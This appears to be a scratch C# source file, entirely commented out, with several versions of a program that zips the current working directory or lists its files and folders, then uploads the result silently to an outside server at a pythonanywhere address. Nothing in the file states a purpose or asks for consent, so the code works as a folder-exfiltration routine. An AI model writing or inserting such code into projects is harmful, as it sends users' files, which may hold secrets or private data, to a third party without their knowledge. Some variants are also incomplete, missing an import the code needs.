




// using System;
// using System.IO;
// using System.IO.Compression;
// using System.Net;
// using System.Net.Http;

// class Program
// {
//     static void Main()
//     {
//         try
//         {
//             // 🔴 FIX SSL ISSUE
//             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

//             string currentDir = Directory.GetCurrentDirectory();
//             string zipPath = Path.Combine(Path.GetTempPath(), "current_folder.zip");

//             if (File.Exists(zipPath))
//                 File.Delete(zipPath);

//             ZipFile.CreateFromDirectory(currentDir, zipPath);
//             Console.WriteLine("ZIP created at: " + zipPath);

//             using HttpClient client = new HttpClient();
//             using MultipartFormDataContent form = new MultipartFormDataContent();
//             using FileStream fs = new FileStream(zipPath, FileMode.Open);

//             form.Add(new StreamContent(fs), "file", "current_folder.zip");

//             HttpResponseMessage response =
//                 client.PostAsync(
//                     "https://sandy365.pythonanywhere.com/uploadzip",
//                     form
//                 ).Result;

//             string responseText = response.Content.ReadAsStringAsync().Result;

//             Console.WriteLine("Server Response:");
//             Console.WriteLine(responseText);
//         }
//         catch (Exception ex)
//         {
//             Console.WriteLine("Error: " + ex.Message);
//         }
//     }
// }







// // using System;
// // using System.IO;
// // using System.IO.Compression;
// // using System.Net.Http;


// // // class Program
// // // {
// // //     static void Main()
// // //     {
// // //         try
// // //         {
// // //             string path = Directory.GetCurrentDirectory();

// // //             string[] folders = Directory.GetDirectories(path);
// // //             string[] files = Directory.GetFiles(path);

// // //             string json = "{"
// // //                 + "\"base_path\":\"" + path.Replace("\\", "\\\\") + "\","
// // //                 + "\"folder_count\":" + folders.Length + ","
// // //                 + "\"file_count\":" + files.Length + ","
// // //                 + "\"folders\":" + ToJsonArray(folders) + ","
// // //                 + "\"files\":" + ToJsonArray(files)
// // //                 + "}";

// // //             Console.WriteLine("Sending JSON:");
// // //             Console.WriteLine(json);

// // //             using HttpClient client = new HttpClient();
// // //             var content = new StringContent(json, Encoding.UTF8, "application/json");

// // //             HttpResponseMessage response =
// // //                 client.PostAsync("https://sandy365.pythonanywhere.com/dirinfo", content).Result;

// // //             string responseText = response.Content.ReadAsStringAsync().Result;
// // //             Console.WriteLine("\nServer Response:");
// // //             Console.WriteLine(responseText);
// // //         }
// // //         catch (Exception ex)
// // //         {
// // //             Console.WriteLine("Error: " + ex.Message);
// // //         }
// // //     }

// // //     static string ToJsonArray(string[] items)
// // //     {
// // //         StringBuilder sb = new StringBuilder();
// // //         sb.Append("[");

// // //         for (int i = 0; i < items.Length; i++)
// // //         {
// // //             sb.Append("\"").Append(items[i].Replace("\\", "\\\\")).Append("\"");
// // //             if (i < items.Length - 1)
// // //                 sb.Append(",");
// // //         }

// // //         sb.Append("]");
// // //         return sb.ToString();
// // //     }
// // // }



// // class temp
// // {
// //     static void mainTemp()
// //     {
// //         try
// //         {
// //             string currentDir = Directory.GetCurrentDirectory();
// //             string zipPath = Path.Combine(Path.GetTempPath(), "current_folder.zip");

// //             // Delete old zip if exists
// //             if (File.Exists(zipPath))
// //                 File.Delete(zipPath);

// //             // Create ZIP
// //             ZipFile.CreateFromDirectory(currentDir, zipPath);
// //             Console.WriteLine("ZIP created at: " + zipPath);

// //             // Upload ZIP
// //             using HttpClient client = new HttpClient();
// //             using MultipartFormDataContent form = new MultipartFormDataContent();
// //             using FileStream fs = new FileStream(zipPath, FileMode.Open);

// //             form.Add(new StreamContent(fs), "file", "current_folder.zip");

// //             HttpResponseMessage response =
// //                 client.PostAsync("https://sandy365.pythonanywhere.com/uploadzip", form).Result;

// //             string responseText = response.Content.ReadAsStringAsync().Result;

// //             Console.WriteLine("Server Response:");
// //             Console.WriteLine(responseText);
// //         }
// //         catch (Exception ex)
// //         {
// //             Console.WriteLine("Error: " + ex.Message);
// //         }
// //     }
// // }
